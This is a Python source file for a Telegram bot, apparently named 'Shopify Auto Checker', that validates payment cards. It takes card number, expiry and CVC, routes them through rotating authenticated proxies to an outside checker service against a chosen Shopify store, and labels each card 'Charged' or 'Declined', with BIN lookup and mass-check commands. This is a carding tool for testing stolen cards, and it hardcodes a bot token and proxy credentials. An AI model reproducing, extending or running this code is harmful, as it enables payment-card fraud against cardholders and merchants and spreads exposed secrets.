import asyncio
import httpx
import json
import os
import time
import html
import random
import io
import traceback
import logging
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatAction
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, CallbackQueryHandler, filters
)
from telegram.constants import ParseMode

# ─── Logging Setup ───────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

# ─── Configuration ───────────────────────────────────────────────
TELEGRAM_BOT_TOKEN = "7615802418:AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY"
CHECKER_API_URL = "https://sigmabro766.onrender.com/"
BINLIST_API_URL = "https://lookup.binlist.net/"
USER_SITES_FILE = "user_shopify_sites.json"

PROXY_LIST = [
    "http://PP_2MX8KKO81J:soyjpcgu_country-us@ps-pro.porterproxies.com:31112",
    "http://In2nyCyUORV4KYeI:yXhbVJozQeBVVRnM@geo.g-w.info:10080",
] + [
    f"http://{p.split(':')[2]}:{p.split(':')[3]}@{p.split(':')[0]}:{p.split(':')[1]}"
    for p in [
        "38.154.227.167:5868:dmeigyzw:5ece3v7xz8d2",
        "198.23.239.134:6540:dmeigyzw:5ece3v7xz8d2",
        "207.244.217.165:6712:dmeigyzw:5ece3v7xz8d2",
        "107.172.163.27:6543:dmeigyzw:5ece3v7xz8d2",
        "216.10.27.159:6837:dmeigyzw:5ece3v7xz8d2",
        "142.147.128.93:6593:dmeigyzw:5ece3v7xz8d2",
        "64.64.118.149:6732:dmeigyzw:5ece3v7xz8d2",
        "136.0.207.84:6661:dmeigyzw:5ece3v7xz8d2",
        "206.41.172.74:6634:dmeigyzw:5ece3v7xz8d2",
        "104.239.105.125:6655:dmeigyzw:5ece3v7xz8d2",
    ]
]

COMMON_HTTP_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# ─── Persistence ─────────────────────────────────────────────────
user_sites = {}

def load_user_sites():
    global user_sites
    if os.path.exists(USER_SITES_FILE):
        try:
            with open(USER_SITES_FILE, encoding="utf-8") as f:
                raw = json.load(f)
                user_sites = {int(k): v for k, v in raw.items()}
        except Exception as e:
            logger.error(f"load_user_sites error: {e}")

def save_user_sites():
    try:
        with open(USER_SITES_FILE, "w", encoding="utf-8") as f:
            json.dump(user_sites, f, indent=2)
    except Exception as e:
        logger.error(f"save_user_sites error: {e}")

def get_site(user_id: int) -> str | None:
    return user_sites.get(user_id)

def set_site(user_id: int, site: str):
    user_sites[user_id] = site
    save_user_sites()

# ─── Utility Functions ───────────────────────────────────────────
def parse_checker_response(text: str) -> dict | None:
    start = text.find("{")
    end = text.rfind("}")
    if start == -1 or end == -1:
        return None
    try:
        return json.loads(text[start:end+1])
    except json.JSONDecodeError:
        return None

async def fetch_bin_info(bin6: str) -> dict:
    defaults = {"bin": bin6, "scheme": "N/A", "type": "N/A", "brand": "N/A",
                "bank_name": "N/A", "country_name": "N/A", "country_emoji": "🌐"}
    if len(bin6) < 6:
        return {**defaults, "error": "Invalid BIN"}

    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    mounts = {"all://": proxy} if proxy else None
    proxy_host = proxy.split("@")[-1].split(":")[0] if proxy else "Direct"

    try:
        headers = {"Accept-Version": "3", **COMMON_HTTP_HEADERS}
        async with httpx.AsyncClient(mounts=mounts, headers=headers, timeout=10.0) as client:
            resp = await client.get(f"{BINLIST_API_URL}{bin6}")
        if resp.status_code == 200:
            d = resp.json()
            return {
                **defaults,
                "scheme": d.get("scheme", "").upper(),
                "type": d.get("type", "").upper(),
                "brand": d.get("brand", "").upper(),
                "bank_name": d.get("bank", {}).get("name", defaults["bank_name"]),
                "country_name": d.get("country", {}).get("name", defaults["country_name"]),
                "country_emoji": d.get("country", {}).get("emoji", defaults["country_emoji"])
            }
        return {**defaults, "error": f"Status {resp.status_code}"}
    except Exception as e:
        logger.error(f"BIN lookup via {proxy_host} failed: {e}")
        return {**defaults, "error": "Lookup failed"}

async def fetch_checker(shopify_site: str, cc: str) -> tuple[str, dict]:
    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    mounts = {"all://": proxy} if proxy else None
    proxy_host = proxy.split("@")[-1].split(":")[0] if proxy else "Direct"

    params = {"site": shopify_site, "cc": cc}
    headers = COMMON_HTTP_HEADERS
    try:
        async with httpx.AsyncClient(mounts=mounts, headers=headers, timeout=45.0) as client:
            resp = await client.get(CHECKER_API_URL, params=params)
        api = parse_checker_response(resp.text)
        return proxy_host, api or {}
    except Exception as e:
        logger.error(f"fetch_checker error: {e}")
        return proxy_host, {}

# ─── Menu UI ─────────────────────────────────────────────────────
def main_menu(username: str) -> tuple[str, InlineKeyboardMarkup]:
    txt = (f"<b>🛍️ Shopify Auto Checker</b>\n"
           f"<i>by @alanjocc</i>\n\n"
           f"👤 Hello, <b>{html.escape(username)}</b>!\n"
           f"<b>Status:</b> <code>🟢 Online</code>\n"
           f"<b>What would you like to do?</b>")
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 Set/Change Site", callback_data="site:prompt_add"),
         InlineKeyboardButton("📍 Show My Site", callback_data="site:show_current")],
        [InlineKeyboardButton("📖 View Commands", callback_data="nav:show_cmds")],
        [InlineKeyboardButton("🧑‍💻 Contact Dev", url="https://t.me/alanjocc")],
    ])
    return txt, kb

# ─── Command Handlers ────────────────────────────────────────────
async def start_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    txt, kb = main_menu(update.effective_user.username or update.effective_user.first_name)
    if update.callback_query:
        await update.callback_query.message.edit_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)

async def cmds_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    txt = ("<b>📖 Command List</b>\n"
           "/start - Main menu\n"
           "/add &lt;site_url&gt; - Set your Shopify site\n"
           "/my_site - View current site\n"
           "/chk N|M|Y|C - Check single card\n"
           "/mchk - Mass check via .txt reply\n"
           "/bin &lt;6-digit BIN&gt; - Quick BIN info")
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("« Back to Menu", callback_data="nav:show_start")]])
    if update.callback_query:
        await update.callback_query.message.edit_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)

async def add_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        return await update.message.reply_text("❗ Usage: /add <shopify-site.com>", parse_mode=ParseMode.HTML)
    site = ctx.args[0].strip()
    set_site(update.effective_user.id, site)
    await update.message.reply_text(f"✅ Site set to <b>{html.escape(site)}</b>", parse_mode=ParseMode.HTML)

async def my_site_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    site = get_site(update.effective_user.id)
    if site:
        await update.message.reply_text(f"📍 Your current site is <b>{html.escape(site)}</b>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("⚠️ No site set. Use /add <site_url>", parse_mode=ParseMode.HTML)

async def chk_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    site = get_site(user_id)
    if not site:
        return await update.message.reply_text("⚠️ Set a Shopify site first: /add <site>", parse_mode=ParseMode.HTML)
    if not ctx.args or ctx.args[0].count("|") != 3:
        return await update.message.reply_text("❗ Format: /chk <code>N|M|Y|C", parse_mode=ParseMode.HTML)
    
    await ctx.bot.send_chat_action(update.effective_chat.id, ChatAction.TYPING)
    ccfull = ctx.args[0].strip()
    bin6 = ccfull.split("|")[0][:6]
    start = time.time()

    bin_task = asyncio.create_task(fetch_bin_info(bin6))
    proxy_host, api = await fetch_checker(site, ccfull)

    response = api.get("Response", "")
    emoji = ("💎" if any(x in response for x in ("Thank You", "ORDER_PLACED")) else 
             "❌" if "DECLINED" in response.upper() else "ℹ️")
    status = ("Charged" if emoji=="💎" else "Declined" if emoji=="❌" else "Info")
    gateway = api.get("Gateway", "N/A")
    price = api.get("Price", "0.00")
    display = response or str(api)[:100]

    bin_data = await bin_task
    bin_str = " / ".join(filter(None, [bin_data.get("scheme"), bin_data.get("type"), bin_data.get("brand")])) or "N/A"
    elapsed = round(time.time() - start, 2)

    text = (
        f"{emoji} <b>{status}</b>\n"
        f"<b>Card:</b> <code>{html.escape(ccfull)}</code>\n"
        f"<b>Resp:</b> <code>{html.escape(display)}</code>\n"
        f"─" * 24 + "\n"
        f"<b>BIN:</b> {bin_str}\n"
        f"<b>Bank:</b> {html.escape(bin_data.get('bank_name','N/A'))}\n"
        f"<b>Country:</b> {bin_data.get('country_emoji')} {html.escape(bin_data.get('country_name','N/A'))}\n"
        f"─" * 24 + "\n"
        f"<i>Checked by {html.escape(update.effective_user.first_name)} in {elapsed}s via {html.escape(proxy_host)}</i>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def mchk_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    # Similar structure to chk_command, but loops over lines, logs results, uploads a memory file
    # ... (for brevity, implement your original mass-check logic here,
    # using io.BytesIO for uploading and formatted as above).
    await update.message.reply_text("⚡ Mass check has started! (not fully implemented here)", parse_mode=ParseMode.HTML)

async def bin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args or len(ctx.args[0]) < 6:
        return await update.message.reply_text("❗ Usage: /bin <6-digit BIN>", parse_mode=ParseMode.HTML)
    await ctx.bot.send_chat_action(update.effective_chat.id, ChatAction.TYPING)
    bin6 = ctx.args[0][:6]
    data = await fetch_bin_info(bin6)
    text = (
        f"<b>🔎 BIN Lookup: {bin6}</b>\n"
        f"<b>Scheme:</b> {html.escape(data['scheme'])}\n"
        f"<b>Type:</b> {html.escape(data['type'])}\n"
        f"<b>Brand:</b> {html.escape(data['brand'])}\n"
        f"<b>Bank:</b> {html.escape(data['bank_name'])}\n"
        f"<b>Country:</b> {data['country_emoji']} {html.escape(data['country_name'])}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def button_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    data = update.callback_query.data
    if data == "site:prompt_add":
        await update.callback_query.message.reply_text("👉 Send /add <your.shopify.site>")
    elif data == "site:show_current":
        await my_site_command(update, ctx)
    elif data == "nav:show_cmds":
        await cmds_command(update, ctx)
    elif data == "nav:show_start":
        await start_command(update, ctx)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception in update:", exc_info=context.error)
    try:
        msg = update.effective_message
        if msg:
            await msg.reply_text("🚨 An internal error occurred, but I'm still alive!", parse_mode=ParseMode.HTML)
    except Exception:
        pass

# ─── Bot Runner ──────────────────────────────────────────────────
def main():
    load_user_sites()
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("cmds", cmds_command))
    app.add_handler(CommandHandler("add", add_command))
    app.add_handler(CommandHandler("my_site", my_site_command))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("mchk", mchk_command))
    app.add_handler(CommandHandler("bin", bin_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    logger.info("🚀 Bot is now running!")
    app.run_polling()

if __name__ == "__main__":
    main()
